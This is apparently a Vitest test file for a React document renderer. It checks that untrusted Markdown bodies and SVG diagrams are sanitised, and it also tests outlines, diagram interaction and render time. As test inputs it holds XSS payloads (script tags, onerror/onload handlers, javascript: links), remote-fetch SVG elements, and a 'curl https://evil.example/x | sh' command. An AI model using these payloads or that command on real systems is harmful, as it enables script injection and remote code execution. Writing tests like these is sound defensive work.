// The document renderer (19, principle 9; 32, design change 8): a body is untrusted text, so nothing it holds runs;
// headings carry the outline's anchors; a check block reads under its name; each diagram is the renderer's SVG,
// inlined after the block that cites it, with the view's classes on hover and click.
import { cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import { afterEach, expect, test, vi } from "vitest";
import { Document } from "./doc/Document";
import { blocks, clean, cleanSvg, outlineOf } from "./doc/markdown";
import large from "./fixtures/research-stage.md?raw";

afterEach(() => (cleanup(), vi.unstubAllGlobals(), vi.restoreAllMocks(), window.history.pushState(null, "", "/")));

test("a body's script, handler, style, form, data attribute and remote image never reach the page", () => {
  const body = [
    "## Probe",
    "<script>alert(1)</script>",
    '<img src="x" onerror="alert(2)">',
    "[x](javascript:alert(3)) and <b>bold</b>",
    "<svg onload=alert(4)><circle r=1></circle></svg>",
    "| a <img src=y onerror=alert(5)> |\n|---|\n| <script>alert(6)</script> |",
    "<p>x</p><style>body { display: none }</style>",
    '<div style="position:fixed;inset:0;z-index:9999">fake page</div>',
    '<form action="https://example.com"><input name="q"><button>go</button><textarea></textarea><select></select></form>',
    '<div data-row="" data-command="curl https://evil.example/x | sh" tabindex="0" autofocus>a row</div>',
    '<nav class="outline land">dressed as chrome</nav> <code class="language-sh">ls</code>',
    '![remote](https://evil.example/pixel.png) ![inline](data:image/gif;base64,R0lGOD) ![here](/assets/a.png)',
  ].join("\n\n");
  render(<Document body={body} />);
  const prose = document.querySelector(".prose")!;
  // Nothing runs: no script and no handler is left to run. happy-dom runs neither, so the proof is the markup.
  expect(prose.querySelector("script")).toBeNull();
  expect(prose.querySelector("[onerror], [onload]")).toBeNull();
  expect(prose.querySelector('a[href^="javascript"]')).toBeNull();
  expect(prose.querySelector("b")?.textContent).toBe("bold");
  // Nothing restyles the page, posts, takes focus or dresses as its chrome (18, check 6).
  expect(prose.querySelector("style, form, input, button, textarea, select")).toBeNull();
  expect(prose.querySelector("[style], [tabindex], [autofocus]")).toBeNull();
  expect(prose.querySelector("[data-row], [data-command]")).toBeNull();
  expect(prose.querySelector(".outline, .land")).toBeNull();
  expect(prose.querySelector("code.language-sh")?.textContent).toBe("ls");
  // An image loads only from the page or a `data:` URL; a remote one reads as a link.
  expect(Array.from(prose.querySelectorAll("img")).map((i) => i.getAttribute("alt"))).toEqual([null, null, "inline", "here"]);
  expect(screen.getByRole("link", { name: "remote" }).getAttribute("href")).toBe("https://evil.example/pixel.png");
  expect(clean('<img src="x" onerror="alert(2)">')).toBe('<img src="x">');
});

// A remote `<image>`, `<use>` or `<feImage>`, or a remote `url()` in an SVG style, would fetch its URL when the page
// holds it, and tell the host the page was read. A body's `id` would take a page anchor; its `aria-*` or `role` would
// relabel the page's regions.
const FETCHING =
  '<svg viewBox="0 0 10 10"><image href="https://example.com/i.png"></image><image href="data:image/gif;base64,R0lGOD"></image>' +
  '<image href="/assets/a.png"></image><use href="https://example.com/s.svg#a"></use><use href="#local"></use>' +
  '<filter id="f"><feImage href="https://example.com/f.png"></feImage></filter>' +
  '<g style="fill: url(https://example.com/p.svg#x)"></g><g style="fill: url(#grad)"></g></svg>';

test("a body or a diagram fetches nothing from another origin; a body's ids, aria attributes and roles go", () => {
  const remote = (root: Element) =>
    Array.from(root.querySelectorAll("*")).flatMap((el) => Array.from(el.attributes).map((a) => a.value)).filter((v) => v.includes("example.com"));
  const svg = document.createElement("div");
  svg.innerHTML = cleanSvg(FETCHING);
  expect(remote(svg)).toEqual([]);
  expect(Array.from(svg.querySelectorAll("image")).map((i) => i.getAttribute("href"))).toEqual(["data:image/gif;base64,R0lGOD", "/assets/a.png"]);
  expect(svg.querySelectorAll("g")[1].getAttribute("style")).toBe("fill: url(#grad)");
  // happy-dom drops an SVG's `<style>` text (above); the headless-Chrome probe of the PR shows its `url()` and `@import`.
  const body = [
    "## Probe",
    FETCHING,
    '<p id="tl-dr" aria-label="outline" aria-hidden="true" role="note">posing</p>',
    '<a id="fig-x" href="#probe" aria-current="location">jump</a>',
  ].join("\n\n");
  render(<Document body={body} outline={[{ depth: 2, heading: "Probe", anchor: "probe" }]} />);
  const prose = document.querySelector(".prose")!;
  expect(remote(prose)).toEqual([]);
  expect(prose.querySelectorAll("image")).toHaveLength(2);
  expect(Array.from(prose.querySelectorAll("[id]")).map((e) => e.id)).toEqual(["probe"]);
  expect(Array.from(prose.querySelectorAll("*")).flatMap((e) => e.getAttributeNames().filter((n) => n.startsWith("aria-")))).toEqual([]);
  expect(screen.getByText("posing").getAttributeNames()).toEqual([]);
});

test("headings take the outline's anchors, a table is a table, and a check block reads under its name", () => {
  const body = [
    "Lead with a [[projects/bp/designs/system|link]].",
    "## Finish line",
    "| a | b |\n|---|---|\n| 1 | 2 |",
    "```check shell {name=api-routes expect=0 severity=warn}\ncurl x\n```",
    "### Deep `one`",
    "text",
  ].join("\n\n");
  const outline = [
    { depth: 2, heading: "Finish line", anchor: "finish-line" },
    { depth: 3, heading: "Deep `one`", anchor: "deep-one" },
  ];
  expect(outlineOf(body)).toEqual(outline);
  render(<Document body={body} outline={outline} />);
  expect(document.getElementById("finish-line")?.tagName).toBe("H2");
  expect(document.getElementById("deep-one")?.innerHTML).toBe("Deep <code>one</code>");
  expect(document.querySelectorAll(".prose table td")).toHaveLength(2);
  expect(document.querySelector("figure.check figcaption")?.textContent).toBe("api-routes · check shell · warn");
  expect(document.querySelector("figure.check code")?.textContent).toBe("curl x");
  expect(screen.getByRole("link", { name: "link" }).getAttribute("href")).toBe("/node/projects/bp/designs/system");
  const links = screen.getByRole("navigation", { name: "outline" }).querySelectorAll("a");
  expect(Array.from(links).map((a) => [a.getAttribute("href"), a.className])).toEqual([
    ["#finish-line", ""],
    ["#deep-one", "d3"],
  ]);
  fireEvent.click(links[1]);
  expect(links[1].getAttribute("aria-current")).toBe("location");
  expect(window.location.hash).toBe("#deep-one");
});

test("a folded body hides its outline; a link into it opens the fold and shows the outline", () => {
  render(
    <Document body={"## A\n\nx\n\n## B\n\ny"} fold="Body">
      <a href="#b">to B</a>
    </Document>,
  );
  const fold = document.querySelector("details.fold") as HTMLDetailsElement;
  expect(fold.open).toBe(false);
  expect(screen.queryByRole("navigation", { name: "outline" })).toBeNull();
  fireEvent.click(screen.getByRole("link", { name: "to B" }));
  expect(fold.open).toBe(true);
  const outline = screen.getByRole("navigation", { name: "outline" });
  expect(within(outline).getByRole("link", { name: "B" }).getAttribute("aria-current")).toBe("location");
});

test("each diagram follows the block that cites it; one the body never cites follows the body", () => {
  const body = "## Context\n\n*Diagram [`ctx`](/projects/bp/designs/system/diagrams/ctx.html).*\n\nAfter.\n\n## Next\n\nText.";
  const plan = blocks(body, outlineOf(body), ["ctx", "other"]);
  const shape = plan.map((b) => (b.kind === "figure" ? `${b.name} in ${b.section ?? "no section"}` : b.kind));
  expect(shape).toEqual(["heading", "html", "ctx in context", "html", "heading", "html", "other in no section"]);
  expect(plan[1].kind === "html" && plan[1].html).toContain('href="#fig-ctx"');
});

test("a section the page shows above leaves the body, but a diagram it cites still opens the body", () => {
  const body = "Lead.\n\n## TL;DR\n\nShort; see diagrams/ctx.\n\n### Inside\n\nx\n\n## Next\n\nText.";
  const plan = blocks(body, outlineOf(body), ["ctx"], ["", "tl-dr"]);
  const shape = plan.map((b) => (b.kind === "figure" ? `${b.name} in ${b.section}` : b.kind === "heading" ? b.anchor : b.kind));
  expect(shape).toEqual(["ctx in tl-dr", "next", "html"]);
  render(<Document body={body} shown={["", "tl-dr"]} />);
  const links = screen.getByRole("navigation", { name: "outline" }).querySelectorAll("a");
  expect(Array.from(links).map((a) => a.getAttribute("href"))).toEqual(["#tl-dr", "#next"]);
});

// No `<style>` here, and the `<script>` comes last: happy-dom's parser drops what follows a raw-text element inside
// an `<svg>`. This test does not prove that the renderer's `<style>` survives `cleanSvg`; the staged copy's
// `bp-containers` drawing, opened in a browser, does.
const SVG =
  '<svg class="bp" viewBox="0 0 10 10"><metadata id="x-index">{"a":1}</metadata>' +
  '<g class="node" data-id="a" onclick="alert(2)"><rect class="box"></rect></g>' +
  '<g class="node" data-id="b"><rect></rect></g><g class="node focus" data-id="c"><rect></rect></g>' +
  '<g class="edge" data-id="a-b" data-from="a" data-to="b"></g><g class="label" data-id="l1" data-of="a-b"></g>' +
  '<g class="group" data-id="g"></g><script>alert(1)</script></svg>';

test("a diagram inlines its sanitised SVG; hover focuses and dims, click selects and marks the citing section", async () => {
  vi.stubGlobal("fetch", vi.fn(async () => new Response(SVG, { status: 200 })));
  render(<Document body={"## Context\n\nSee diagrams/ctx for the parts.\n"} diagrams={[{ name: "ctx", title: "Context", src: "/api/x" }]} />);
  await waitFor(() => expect(document.querySelector("figure.fig svg")).toBeTruthy());
  const svg = document.querySelector("figure.fig svg")!;
  expect(svg.querySelector("script")).toBeNull();
  expect(svg.querySelector("[onclick]")).toBeNull();
  expect(svg.querySelector("metadata")?.textContent).toBe('{"a":1}');
  expect(svg.getAttribute("style")).toContain("color-scheme: dark");
  const part = (id: string) => svg.querySelector(`[data-id="${id}"]`)!;
  const dim = () => ["a", "b", "c", "a-b", "l1", "g"].filter((id) => part(id).classList.contains("dim"));
  fireEvent.mouseOver(part("a").querySelector("rect")!);
  expect(part("a").classList.contains("focus")).toBe(true);
  expect(dim()).toEqual(["c"]);
  fireEvent.mouseLeave(svg.parentElement!);
  expect([part("a").classList.contains("focus"), part("c").classList.contains("focus")]).toEqual([false, true]);
  expect(dim()).toEqual([]);
  fireEvent.click(part("l1"));
  expect(svg.querySelectorAll(".selected")).toHaveLength(1);
  expect(part("a-b").classList.contains("selected")).toBe(true);
  expect(screen.getByRole("link", { name: "Context" }).getAttribute("aria-current")).toBe("location");
  // As the viewer does: when the pointer leaves, the focus returns to the selection, an edge with its ends.
  fireEvent.mouseOver(part("c").querySelector("rect")!);
  fireEvent.mouseLeave(svg.parentElement!);
  expect(part("a-b").classList.contains("focus")).toBe(true);
  expect(dim()).toEqual(["c"]);
});

test("the largest design body in the converted vault renders as a document", () => {
  const t0 = performance.now();
  render(<Document body={large} />);
  const ms = performance.now() - t0;
  console.info(`render research-stage.md (${large.length} bytes): ${ms.toFixed(0)} ms`);
  expect(document.querySelectorAll(".prose h2").length).toBe(outlineOf(large).filter((h) => h.depth === 2).length);
  expect(ms).toBeLessThan(3000);
});
